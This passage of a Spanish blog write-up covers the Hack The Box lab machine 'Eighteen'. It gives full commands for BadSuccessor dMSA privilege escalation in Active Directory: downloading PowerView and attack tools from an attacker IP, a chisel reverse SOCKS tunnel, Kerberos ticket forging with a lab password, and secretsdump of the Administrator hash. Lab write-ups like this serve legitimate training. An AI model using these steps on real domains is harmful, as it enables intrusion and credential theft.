+<p>Vemos que el usuario adma.scott tiene permisos CanPSRemote a través del grup IT sobre DC01.EIGHTEEN.HTB.</p>
+<p>Como veo que no logro realizar nada más con este permiso y no tenemos ningún puerto interesante expuesto por defecto pruebo a seguir enumerando.</p>
+<h2 id="badsuccesor-vulnerability">BadSuccesor Vulnerability<a hidden class="anchor" aria-hidden="true" href="#badsuccesor-vulnerability">#</a></h2>
+<p>Para ayudarme a entender como funciona esta vulnerabilidad me he basado en este articulo que encontré en internet:</p>
+<p><a href="https://www.akamai.com/es/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory#badsuccessor">Abusing dMSA for Privilege Escalation</a></p>
+<h3 id="download-file-with-powershell--import-module">Download File with Powershell + Import-Module<a hidden class="anchor" aria-hidden="true" href="#download-file-with-powershell--import-module">#</a></h3>
+<p>Nos descargamos PowerView.ps1 a nuestra máquina victima y luego importamos sus módulos para poder sacar información:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadFile</span><span class="p">(</span><span class="s1">&#39;http://10.10.15.142:8081/PowerView.ps1&#39;</span><span class="p">,</span><span class="s1">&#39;C:\Users\adam.scott\Documents\PowerView.ps1&#39;</span><span class="p">)</span>
+</span></span></code></pre></div><p><img alt="eighteen_machine_20" loading="lazy" src="/img/eighteen/eighteen_machine_20.png"></p>
+<p>Una vez hecho esto, lo que necesitamos encontrar es si tenemos permisos para crear msDS-DelegatedManagedServiceAccount o para crear objetos secundarios en cualquier OU para crear una <code>dMSA</code>.</p>
+<p><img alt="eighteen_machine_21" loading="lazy" src="/img/eighteen/eighteen_machine_21.png"></p>
+<h3 id="checking-create-child-objects-permission-under-staff">Checking create child objects permission under Staff<a hidden class="anchor" aria-hidden="true" href="#checking-create-child-objects-permission-under-staff">#</a></h3>
+<p><a href="https://github.com/akamai/BadSuccessor">Script Identificador</a></p>
+<p>Y ejecutando el siguiente script en powershell, confirmamos que tenemos permisos sobre la OU Staff gracias al gupo IT:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadFile</span><span class="p">(</span><span class="s1">&#39;http://10.10.15.142:8081/Get-BadSuccessorOUPermissions.ps1&#39;</span><span class="p">,</span><span class="s1">&#39;C:\Users\adam.scott\Desktop\BadSuccessor.ps1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">.\</span><span class="n">BadSuccessor</span><span class="p">.</span><span class="py">ps1</span>
+</span></span></code></pre></div><p><img alt="eighteen_machine_23" loading="lazy" src="/img/eighteen/eighteen_machine_23.png"></p>
+<p><img alt="eighteen_machine_24" loading="lazy" src="/img/eighteen/eighteen_machine_24.png"></p>
+<h3 id="explotación-dmsa">Explotación dMSA<a hidden class="anchor" aria-hidden="true" href="#explotación-dmsa">#</a></h3>
+<h4 id="manual---failed">Manual  / FAILED<a hidden class="anchor" aria-hidden="true" href="#manual---failed">#</a></h4>
+<p>Al final pude ver que podemos crear una dMSA dentro de la unidad organizativa <code>Staff</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Powershell" data-lang="Powershell"><span class="line"><span class="cl"><span class="nb">New-ADServiceAccount</span> <span class="n">-Name</span> <span class="s2">&#34;attack_dMSA&#34;</span> <span class="n">-DNSHostName</span> <span class="s2">&#34;dontcare.com&#34;</span> <span class="n">-CreateDelegatedServiceAccount</span> <span class="n">-PrincipalsAllowedToRetrieveManagedPassword</span> <span class="s2">&#34;DC01$&#34;</span> <span class="n">-path</span> <span class="s2">&#34;OU=Staff,DC=eighteen,DC=htb&#34;</span>
+</span></span></code></pre></div><p><img alt="eighteen_machine_22" loading="lazy" src="/img/eighteen/eighteen_machine_22.png"></p>
+<p>Ahora que hemos creado y somos propretarios de esta dMSA, tenemos la capacidad de otrogarnos permisos para editar atributos de la misma. En este caso vamos a editar estos dos valores:</p>
+<ul>
+<li>
+<p><strong><em>msDS-ManagedAccountPrecededByLink</em></strong>: en esta opción vamos a indicar el nombre destintivo (DN) de la cuenta a la que queremos remplazar.</p>
+</li>
+<li>
+<p><strong><em>msDS-DelegatedMSAState</em></strong>: establecemos el valor del estado de la dMSA en 2 para simular que la migración ha sido completada.</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$dMSA</span> <span class="p">=</span> <span class="p">[</span><span class="no">ADSI</span><span class="p">]</span><span class="s2">&#34;LDAP://CN=attack_dMSA,OU=Staff,DC=eighteen,DC=htb&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dMSA</span><span class="p">.</span><span class="py">Put</span><span class="p">(</span><span class="s2">&#34;msDS-DelegatedMSAState&#34;</span><span class="p">,</span> <span class="mf">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dMSA</span><span class="p">.</span><span class="py">Put</span><span class="p">(</span><span class="s2">&#34;msDS-ManagedAccountPrecededByLink&#34;</span><span class="p">,</span> <span class="s2">&#34;CN=Administrator,CN=Users,DC=eighteen,DC=htb&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dMSA</span><span class="p">.</span><span class="py">SetInfo</span><span class="p">()</span>
+</span></span></code></pre></div><blockquote>
+<p>Al ejecutar el <code>$dMSA.SetInfo()</code> me daba un Acceso denegado que no puede solucionar, con lo cual tuve que buscar otras maneras para explotar esta vulnerabilidad.</p>
+</blockquote>
+<h4 id="badsuccessorexe---script">BadSuccessor.exe - Script<a hidden class="anchor" aria-hidden="true" href="#badsuccessorexe---script">#</a></h4>
+<p>Entonces buscando POC&rsquo;s me encontré con <code>BadSuccessor.exe</code> (también lo descargamos a la máquina victima) que realiza el mismo proceso que intentamos manualmente pero esta vez si crea la <code>dMSA</code> y le añade los atributos correctamente:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">BadSuccessor</span><span class="p">.</span><span class="py">exe</span> <span class="n">escalate</span> <span class="n">-targetOU</span> <span class="s2">&#34;OU=Staff,DC=eighteen,DC=htb&#34;</span> <span class="n">-dmsa</span> <span class="n">attack_dMSA2</span> <span class="n">-targetUser</span> <span class="s2">&#34;CN=Administrator,CN=Users,DC=eighteen,DC=htb&#34;</span> <span class="n">-dnshostname</span> <span class="n">DC01</span> <span class="n">-user</span> <span class="n">adam</span><span class="p">.</span><span class="py">scott</span> <span class="n">-dc-ip</span> <span class="mf">10.10</span><span class="p">.</span><span class="py">11</span><span class="p">.</span><span class="py">95</span>
+</span></span></code></pre></div><p><img alt="eighteen_machine_25" loading="lazy" src="/img/eighteen/eighteen_machine_25.png"></p>
+<p>Luego de realizar todo este proceso tengo el problema de que no puedo recibir el TGS (Ticket Garanted Service) y el password hash ya que no existe ningún ticket decido importar chisel para hacer port forwarding sobre el puerto de autenticación kerberos para generar un TGT ( Ticket Garanting Ticket).</p>
+<h4 id="port-forwarding-with-chisel--abuse-tgt">Port Forwarding with chisel + Abuse TGT<a hidden class="anchor" aria-hidden="true" href="#port-forwarding-with-chisel--abuse-tgt">#</a></h4>
+<p><a href="https://github.com/jpillora/chisel">Chisel Repository</a></p>
+<p><a href="https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel#bkmrk-usage">Port Forwarding Examples</a></p>
+<p>Nos descargamos chisel a nuestra máquina atacante con <code>wget</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_windows_386.zip
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">unzip -l chisel_1.11.3_windows_386.zip
+</span></span></code></pre></div><p><img alt="eighteen_machine_26" loading="lazy" src="/img/eighteen/eighteen_machine_26.png"></p>
+<p>Luego montamos un servidor http y con .DownloadFile nos descargamos el archivo a la máquina victima:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadFile</span><span class="p">(</span><span class="s1">&#39;http://10.10.14.141:8081/chisel.exe&#39;</span><span class="p">,</span><span class="s1">&#39;C:\Users\adam.scott\Desktop\mythings\chisel.exe&#39;</span><span class="p">)</span>
+</span></span></code></pre></div><p><img alt="eighteen_machine_27" loading="lazy" src="/img/eighteen/eighteen_machine_27.png"></p>
+<p>Y ahora monto el servidor chisel en mi máquina atacante y el cliente chisel en la máquina víctima:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">chisel server -p <span class="m">33</span> --reverse
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">chisel</span><span class="p">.</span><span class="py">exe</span> <span class="n">client</span> <span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="mf">141</span><span class="err">:</span><span class="mf">33</span> <span class="n">R:socks</span>
+</span></span></code></pre></div><p>(Necesitamos camabiar el archivo /etc/proxychains.conf a socks5)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains -q getTGT.py eighteen.htb/adam.scott:<span class="s1">&#39;iloveyou1&#39;</span> -dc-ip 10.10.11.95 -debug
+</span></span></code></pre></div><p>Aunque ejecute el comando con <code>proxychains</code> ahora recibimos el típico error de falta de sincronización con el servidor, con lo cual usando Faketime consigo solucionar este problema:</p>
+<p><a href="https://docs.exegol.com/tips-and-tricks">Tricks Faketime - Exegol</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">faketime <span class="s1">&#39;2025-11-28 05:41:58&#39;</span> zsh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">proxychains -q getTGT.py eighteen.htb/adam.scott:<span class="s1">&#39;iloveyou1&#39;</span> -dc-ip 10.10.11.95
+</span></span></code></pre></div><p>Ahora que tenemos ya el TGT del usuario adam.scott, podemos impersonar a la dMSA &ldquo;attack_dMSA2&rdquo; para obtener un ticket kerberos .ccache.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains /root/.local/share/pipx/venvs/impacket/bin/getST.py -impersonate <span class="s1">&#39;attack_dMSA2$&#39;</span> -dmsa -k -no-pass eighteen.htb/adam.scot -self
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>/workspace/HTB/Eighteen/CONTENT/attack_dMSA2<span class="se">\$</span>@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">proxychains secretsdump.py -k -no-pass dc01.eighteen.htb -just-dc-user Administrator
+</span></span></code></pre></div><p><img alt="eighteen_machine_33" loading="lazy" src="/img/eighteen/eighteen_machine_33.png"></p>
+<p><img alt="eighteen_machine_34" loading="lazy" src="/img/eighteen/eighteen_machine_34.png"></p>
+<p><img alt="eighteen_machine_35" loading="lazy" src="/img/eighteen/eighteen_machine_35.png"></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://borhuub.github.io/tags/easy/">Easy</a></li>
+      <li><a href="https://borhuub.github.io/tags/activedirectory/">ActiveDirectory</a></li>
+      <li><a href="https://borhuub.github.io/tags/mssql-impersonar/">MSSQL-Impersonar</a></li>
+      <li><a href="https://borhuub.github.io/tags/rid-brute/">Rid-Brute</a></li>
+      <li><a href="https://borhuub.github.io/tags/sharphound/">SharpHound</a></li>
+      <li><a href="https://borhuub.github.io/tags/canpsremote/">CanPSRemote</a></li>
+      <li><a href="https://borhuub.github.io/tags/badsuccesor/">BadSuccesor</a></li>
+      <li><a href="https://borhuub.github.io/tags/chisel-ad/">Chisel-AD</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://borhuub.github.io/writeups/conversor/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>Conversor</span>
+  </a>
+  <a class="next" href="https://borhuub.github.io/writeups/expressway/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Expressway</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://borhuub.github.io/">Borhub Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
